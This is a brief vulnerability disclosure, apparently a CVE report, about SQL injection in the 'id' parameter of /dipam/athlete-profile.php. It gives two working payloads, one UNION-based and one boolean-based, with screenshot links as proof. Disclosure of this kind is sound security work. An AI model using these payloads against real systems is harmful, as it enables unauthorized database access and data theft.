BUG_Author: zhangyf

Vulnerability File: /dipam/athlete-profile.php

GET parameter 'id' exists SQL injection vulnerability

Payload1: id=-1' union all select null,null,null,null,null,null,null,null,null,concat(0x56575859,0x60616263),null,null,null-- -

UNION query successful.

![image](https://github.com/M9KJ-TEAM/CVEReport/blob/main/7.png)

Payload2: id=243' AND 123=123 AND 'qwe'='qwe

The Boolean value is judged correctly, so the page is displayed normally.

![image](https://github.com/M9KJ-TEAM/CVEReport/blob/main/8.png)
